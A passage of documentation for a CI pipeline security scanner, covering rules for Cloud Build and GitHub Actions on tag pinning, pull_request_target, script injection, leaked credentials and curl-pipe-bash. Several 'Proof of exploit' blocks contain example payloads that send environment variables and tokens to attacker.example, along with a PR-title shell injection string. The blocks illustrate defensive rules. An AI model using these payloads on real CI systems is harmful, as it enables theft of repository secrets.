**Recommendation.** Pin each ``availableSecrets.secretManager[].versionName`` to a specific version number (``.../versions/7``) rather than ``latest``. Rotate by updating the number when a new version is promoted, not by silently publishing a new version that the next build pulls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-007`](../providers/cloudbuild.md#gcb-007) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-008`: No vulnerability scanning step in Cloud Build pipeline <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-008 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** The detector matches tool names anywhere in the document, step images, ``args``, or ``entrypoint`` strings. Container Analysis API scanning configured at the project level counts as compensating control but is out of scope for this YAML-only check; if you rely on it, suppress this rule via ``--checks``.

**Recommendation.** Add a step that runs a vulnerability scanner, trivy, grype, snyk test, npm audit, pip-audit, osv-scanner, or govulncheck. In Cloud Build this typically looks like a step with ``name: aquasec/trivy`` or an ``entrypoint: bash`` step that invokes ``trivy image`` / ``grype <ref>`` on the built image.

**Source:** [`GCB-008`](../providers/cloudbuild.md#gcb-008) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-009`: Artifacts not signed (no cosign / sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-009 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Silent-pass when the pipeline does not appear to produce artifacts (no ``docker push`` / ``gcloud run deploy`` / ``kubectl apply`` / etc. in any step). The detector matches cosign, sigstore, slsa-framework, and notation.

**Recommendation.** Add a signing step before ``images:`` is resolved, for example, a step with ``name: gcr.io/projectsigstore/cosign`` that runs ``cosign sign --yes <registry>/<repo>@<digest>``. Pair with an attestation step (``cosign attest --predicate sbom.json --type cyclonedx``) so consumers can verify both the signature and the build provenance.

**Source:** [`GCB-009`](../providers/cloudbuild.md#gcb-009) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-002`: pull_request_target checks out PR head <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-002 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `pull_request_target` runs with a write-scope GITHUB_TOKEN and access to repository secrets, deliberately so, since it's how labeling and comment-bot workflows work. When the same workflow then explicitly checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) it executes attacker-controlled code with those privileges.

**Recommendation.** Use `pull_request` instead of `pull_request_target` for any workflow that must run untrusted code. If you need write scope, split the workflow: a `pull_request_target` job that labels the PR, and a separate `pull_request`-triggered job that builds it with read-only secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.

**Proof of exploit.**

# Vulnerable: pull_request_target + checkout PR head =
# attacker code runs with secrets + write-scope token.
name: build-pr
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test            # runs PR-head Makefile

# Attack: any external contributor opens a fork PR with a
# tampered Makefile:
#
#   test:
#   	curl -X POST https://attacker.example/exfil \
#   	  -d "$(env)" \
#   	  -d "$(git config --get-all http.https://github.com/.extraheader)"
#
# CI runs the malicious target with the base repo's secrets
# (every ${{ secrets.* }} the workflow has access to) and a
# write-scope GITHUB_TOKEN. The PR doesn't even need to be
# merged or reviewed — the privileged execution happens at
# PR-open time.

# Safe: split the workflow. The labeler runs with secrets
# but never checks out PR head; the builder runs in
# ``pull_request`` context with no secrets:
name: triage      # privileged half
on: { pull_request_target: { types: [opened, synchronize] } }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit ${{ github.event.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
---
name: build       # unprivileged half
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # checks out PR head
      - run: make test                    # no secrets in scope

**Source:** [`GHA-002`](../providers/github.md#gha-002) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-003`: Script injection via untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-003 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Interpolating attacker-controlled context fields (PR title/body, issue body, comment body, commit message, discussion body, head branch name, `github.ref_name`, `inputs.*`, release metadata, deployment payloads) directly into a `run:` block is shell injection. GitHub expands `${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, or `;` in the source field executes.

**Recommendation.** Pass untrusted values through an intermediate `env:` variable and reference that variable from the shell script. GitHub's expression evaluation happens before shell quoting, so inline `${{ github.event.* }}` is always unsafe.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.

**Proof of exploit.**

# Vulnerable: PR title interpolated straight into shell.
name: triage
on:
  pull_request_target:
    types: [opened, edited]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New PR: ${{ github.event.pull_request.title }}"

# Attack: open a PR with the title:
#
#   foo"; curl -X POST https://attacker.example/exfil \
#         -d "$(env | base64 -w0)"; echo "
#
# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the
# title's `"` closes the echo string and the rest of the line
# becomes shell. The pull_request_target trigger means the
# runner already has secrets and a write-scope GITHUB_TOKEN,
# so the curl exfils every secret the workflow can see.

# Safe: route through env so the value is never interpolated
# into the shell template:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "New PR: $PR_TITLE"

**Source:** [`GHA-003`](../providers/github.md#gha-003) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-004`: Workflow has no explicit permissions block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-004 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Without an explicit `permissions:` block (either top-level or per-job), the GITHUB_TOKEN inherits the repository's default scope, typically `write`. A compromised step receives far more privilege than it needs.

**Recommendation.** Add a top-level `permissions:` block (start with `contents: read`) and grant additional scopes only on the specific jobs that need them.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Read-only / lint-only workflows that do not call any write-scoped API often pass without an explicit block because the default token scope on public repos is read. The rule defaults to MEDIUM confidence to reflect this.

**Source:** [`GHA-004`](../providers/github.md#gha-004) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-005`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-005 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets in GitHub Actions can't be rotated on a fine-grained schedule and remain valid until manually revoked. OIDC with `role-to-assume` yields short-lived credentials per workflow run.

**Recommendation.** Use `aws-actions/configure-aws-credentials` with `role-to-assume` + `permissions: id-token: write` to obtain short-lived credentials via OIDC. Remove the static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- LocalStack and Moto integration tests set ``AWS_ENDPOINT_URL`` to a localhost address and use the sentinel ``test`` / ``test`` access keys (the LocalStack convention). Those values can't authenticate against real AWS, so the rule auto-suppresses an env block that pairs a localhost endpoint with sentinel keys.

**Source:** [`GHA-005`](../providers/github.md#gha-005) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step, e.g. `sigstore/cosign-installer` followed by `cosign sign`, or `slsa-framework/slsa-github-generator` for keyless SLSA provenance. Publish the signature alongside the artifact and verify it at consumption time.

**Seen in the wild.**

- [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): SUNBURST trojanized builds shipped to ~18,000 customers because no post-build signature could be checked against a trusted signing identity. Cryptographic signing on every release would have given downstream consumers a verifiable break with the upstream key, the absence of which was the ambient signal of compromise.
- [PyTorch nightly compromise](https://pytorch.org/blog/compromised-nightly-dependency/) (December 2022): the ``torchtriton`` dependency was hijacked via PyPI dependency-confusion. Sigstore-style attestation tied to the official publisher would have made the impostor build fail verification rather than silently install.

**Source:** [`GHA-006`](../providers/github.md#gha-006) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `anchore/sbom-action`, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the release so consumers can ingest it into their vuln-management pipeline.

**Source:** [`GHA-007`](../providers/github.md#gha-007) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-008`: Credential-shaped literal in workflow body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Every string in the workflow is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc., see `--man secrets` for the full catalog). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to an encrypted repository or environment secret and reference it via `${{ secrets.NAME }}`. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real workflow it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Seen in the wild.**

- Uber 2016 GitHub leak: an AWS access key embedded in a private GitHub repo was reachable to attackers who got at the repo and used it to download driver / rider PII for 57 million accounts. Credential-shaped literals in any source control system (public or private) are one credential-leak away from the same outcome.
- GitGuardian's annual State of Secrets Sprawl reports consistently find millions of fresh credential leaks per year across public commits, with a median time-to-revocation after disclosure of days, not minutes. Pinning secrets to ``${{ secrets.* }}`` removes the artifact from source control entirely.

**Proof of exploit.**

# Vulnerable: AWS access key pasted into the workflow body.
env:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Attack chain:
#  1. Attacker clones/forks the repo or pulls from a public
#     mirror. The literal is in plain text — no credentials
#     needed to read it.
#  2. Attacker uses the key against the AWS account it
#     belongs to. With AmazonEC2FullAccess this is
#     immediate compute hijack; with broader IAM it is
#     full data exfiltration.
#  3. Even after rotation, every git revision and every
#     CI build log retains the value — pull-request
#     mirrors, logging back-ends, and forks all have to
#     be scrubbed.

# Safe: reference a stored secret. The value never lives in
# source control or build logs (GitHub redacts it from output).
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# Better: use OIDC federation. No long-lived key exists.
permissions:
  id-token: write
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/CIRole
      aws-region: us-east-1

**Source:** [`GHA-008`](../providers/github.md#gha-008) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-009`: workflow_run downloads upstream artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-009 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `on: workflow_run` runs in the privileged context of the default branch (write GITHUB_TOKEN, secrets accessible) but consumes artifacts produced by the triggering workflow, which is often a fork PR with no trust boundary. Classic PPE: a malicious PR uploads a tampered artifact, the privileged workflow_run downloads and executes it.

**Recommendation.** Add a verification step BEFORE consuming the artifact: `cosign verify-attestation --type slsaprovenance ...`, `gh attestation verify --owner $OWNER ./artifact`, or publish a checksum manifest from the trusted producer and `sha256sum -c` it. Treat any download from a fork as untrusted input.

**Source:** [`GHA-009`](../providers/github.md#gha-009) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-010`: Local action (./path) on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-010 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `uses: ./path/to/action` resolves the action against the CHECKED-OUT workspace. On `pull_request_target` / `workflow_run`, that workspace can be PR-controlled, meaning the attacker supplies the `action.yml` that runs with default-branch privilege.

**Recommendation.** Move the action to a separate repo under your control and reference it by SHA-pinned `uses: org/repo@<sha>`, or split the workflow so the privileged work runs only on `pull_request` (read-only token, no secrets) where PR-controlled action.yml can't escalate.

**Source:** [`GHA-010`](../providers/github.md#gha-010) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-011`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-011 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `actions/cache` restores by key (and falls through `restore-keys` on miss). When the key includes a value the attacker controls (PR title, head ref, workflow_dispatch input), an attacker can plant a poisoned cache entry that a later default-branch run restores and treats as a clean build cache.

**Recommendation.** Build the cache key from values the attacker can't control: `${{ runner.os }}`, `${{ hashFiles('**/*.lock') }}` (only when the lockfile is enforced by branch protection), and the workflow file path. Never include `github.event.*` PR/issue fields, `github.head_ref`, or `inputs.*` in the key namespace.

**Source:** [`GHA-011`](../providers/github.md#gha-011) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-012`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-012 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Self-hosted runners that don't tear down between jobs leak filesystem and process state. A PR-triggered job writes to `/tmp`; a subsequent prod-deploy job on the same runner reads it. The mitigation is the runner's `--ephemeral` mode, the runner exits after one job and re-registers fresh. The check looks for an `ephemeral` label on the `runs-on` value; without one, the runner is presumed reusable. Recognizes all three `runs-on` shapes: string, list, and `{ group, labels }` dict form.

**Recommendation.** Configure the self-hosted runner to register with `--ephemeral` (the runner exits after one job and is freshly registered), and add an `ephemeral` label so this check can verify it. Consider actions-runner-controller for ephemeral pools.

**Known false positives.**

- Organisations using actions-runner-controller (ARC), autoscaled pools, or vendor runner fleets often use labels like ``arc-*``, ``autoscaled-*``, or ``ephemeral-pool-*`` instead of a bare ``ephemeral`` label. The check only matches the literal ``ephemeral`` token on ``runs-on``; extend via a custom allow-prefix config if your fleet uses a different naming convention. Defaults to MEDIUM confidence.

**Source:** [`GHA-012`](../providers/github.md#gha-012) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-013`: issue_comment trigger without author guard <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-013 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `on: issue_comment` (and `discussion_comment`) fires for every comment on every issue or discussion in the repository. On public repos this means any GitHub user can trigger workflow execution. If the workflow runs commands, deploys, or accesses secrets, the attacker controls timing and can inject payloads through the comment body.

**Recommendation.** Add an `if:` condition that checks `github.event.comment.author_association` (e.g. `contains('OWNER MEMBER COLLABORATOR', ...)`), `github.event.sender.login`, or `github.actor` against an allowlist. Without a guard, any GitHub user can trigger the workflow by posting a comment.

**Known false positives.**

- Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.

**Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-015`: Job has no `timeout-minutes`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without `timeout-minutes`, the job runs until GitHub's 6-hour default kills it. Explicit timeouts cap blast radius, cost, and the window during which a compromised step has access to secrets.

**Recommendation.** Add `timeout-minutes:` to each job, sized to the 95th percentile of historical runtime plus margin. GitHub's default is 360 minutes, an explicitly shorter value limits blast radius and runner cost.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-015`](../providers/github.md#gha-015) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-016 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a workflow. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Seen in the wild.**

- [Codecov Bash uploader compromise](https://about.codecov.io/security-update/) (April 2021): an attacker modified the codecov.io/bash uploader script (commonly fetched via ``curl -s codecov.io/bash | bash``) to exfiltrate environment variables from CI runners (AWS keys, GitHub tokens, signing keys) at thousands of customers for over two months before discovery.
- [event-stream](https://github.com/dominictarr/event-stream/issues/116) (November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) (October 2021): npm-side examples of the same primitive. When the CI runner executes bytes a third party can swap out (via `curl | bash`, an unpinned `npm install`, or a compromised maintainer account), the attacker controls what runs with the runner's credentials in scope. Pinning a digest or vendoring a frozen copy turns a perpetual ambient risk into a one-time review.

**Proof of exploit.**

# Vulnerable: install script piped straight to bash.
steps:
  - run: curl -sL https://example.com/install.sh | bash

# Attack: an attacker who controls the install.sh endpoint
# (compromised CDN, expired domain, BGP hijack, account
# takeover, or simply being the upstream maintainer with bad
# intent) drops a payload that runs in the CI runner with
# every secret available to the job:
#
#   #!/usr/bin/env bash
#   # legitimate-looking install actions...
#   curl -X POST https://attacker.example/exfil \
#     -d "$(env)" -d "$(cat $GITHUB_TOKEN_FILE 2>/dev/null)"
#
# The runner has no way to know the bytes changed.

# Safe: download, verify a known-good digest, then execute.
steps:
  - run: |
      curl -sLo install.sh https://example.com/install.sh
      echo "abc123...expected_sha256  install.sh" | sha256sum -c
      bash install.sh

**Source:** [`GHA-016`](../providers/github.md#gha-016) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a workflow give the container full access to the runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-018 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a workflow. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-018`](../providers/github.md#gha-018) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-019`: GITHUB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-019 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Detects patterns where `GITHUB_TOKEN` is written to files, environment files (`$GITHUB_ENV`), or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, uploaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

**Recommendation.** Never write GITHUB_TOKEN to files, artifacts, or GITHUB_ENV. Use the token inline via ${{ secrets.GITHUB_TOKEN }} in the step that needs it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

# Vulnerable: token written to a file that survives the
# step boundary and lands in the upload-artifact bundle.
jobs:
  build:
    permissions: { contents: write, packages: write }
    steps:
      - run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/token
      - run: make build                   # writes /tmp/token
                                          # into ./dist/
      - uses: actions/upload-artifact@<sha>
        with:
          name: build-output
          path: dist/

# Attack: any contributor (or, on public repos, anyone)
# downloads the artifact:
#
#   gh run download <run-id> -n build-output
#   cat build-output/tmp/token            # full GITHUB_TOKEN
#
# The token is scoped to the workflow's permissions block —
# in this case write to ``contents`` and ``packages``,
# enough to push tampered binaries to GHCR or rewrite the
# branch the workflow runs on. Composes with SCM-001
# (unprotected default branch) into XPC-004's "open a PR,
# fetch artifact, ship malicious binary" loop.

# Other persistence patterns the rule catches:
#   echo "TOKEN=$GITHUB_TOKEN" >> $GITHUB_ENV
#   echo "::set-output name=tok::$GITHUB_TOKEN"
#   echo "$SECRET" | tee /tmp/cache/secret

# Safe: use the token inline in the step that needs it; never
# write it anywhere that survives the step's environment:
      - run: gh release create v1.0.0 dist/*
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

**Source:** [`GHA-019`](../providers/github.md#gha-019) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GHA-020`](../providers/github.md#gha-020) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

